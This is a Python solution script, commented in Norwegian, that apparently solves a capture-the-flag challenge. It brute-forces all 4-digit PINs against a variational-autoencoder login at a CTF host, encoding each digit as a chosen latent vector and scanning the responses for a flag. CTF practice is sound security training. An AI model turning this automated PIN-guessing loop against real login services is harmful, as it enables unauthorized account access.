#!/usr/bin/env python3
import requests
import re
from itertools import product

url = "https://vae-login.ctf.cybertalent.no"
session = requests.Session()

best_vectors = {
    '0': [0.0]*12 + [3.0] + [0.0]*7,
    '1': [0.0]*12 + [-3.0] + [0.0]*7,
    '2': [0.0]*10 + [3.0] + [0.0]*9,
    '3': [0.0]*4 + [-3.0] + [0.0]*4 + [3.0] + [0.0]*10,
    '4': [0.0]*10 + [-3.0] + [0.0]*7 + [-3.0] + [0.0],
    '5': [0.0] + [3.0] + [0.0]*4 + [-3.0] + [0.0]*13,
    '6': [0.0]*19 + [3.0],
    '7': [0.0]*10 + [-3.0] + [0.0]*8 + [-3.0],
    '8': [0.0]*11 + [-3.0] + [0.0]*4 + [-3.0] + [0.0]*3,
    '9': [0.0]*2 + [3.0] + [0.0]*7 + [-3.0] + [0.0]*9,
}

print("Brute-forcing alle 4-sifrede PIN-koder...")
print("="*60)

count = 0
start_from = 3724  # Fortsett fra der vi var

for pin_tuple in product('0123456789', repeat=4):
    pin = ''.join(pin_tuple)
    pin_num = int(pin)
    
    if pin_num < start_from:
        continue
        
    count += 1
    
    vectors = [best_vectors[d] for d in pin]
    
    # Send PIN
    response = session.post(f"{url}/decode_predict", json={"z": vectors})
    html = response.text
    
    # Sjekk også hovedsiden etter POST
    main_response = session.get(url)
    main_html = main_response.text
    
    # Kombiner for søk
    combined = html + main_html
    
    # Sjekk for suksess - MER robust sjekk
    is_incorrect = 'incorrect' in html.lower()
    has_flag = bool(re.search(r'flag\{|FLAG\{|FLAGG', combined, re.IGNORECASE))
    has_success = 'correct!' in combined.lower() or 'success' in combined.lower()
    
    if has_flag or (not is_incorrect):
        print(f"\n*** SUKSESS med PIN {pin}! ***")
        print("=== decode_predict respons ===")
        print(html[-1000:])  # Siste 1000 tegn
        print("\n=== hovedside respons ===")
        print(main_html[-1000:])
        
        # Søk etter flagg
        flag_match = re.search(r'(FLAG\{[^}]+\}|flag\{[^}]+\}|FLAGG\{[^}]+\})', combined, re.IGNORECASE)
        if flag_match:
            print(f"\n*** FLAGG: {flag_match.group(1)} ***")
    
    # Progress update
    if count % 500 == 0:
        print(f"Testet {count} PINs siden {start_from}... (nå: {pin})")

print(f"\nTotalt testet: {count} PIN-koder")
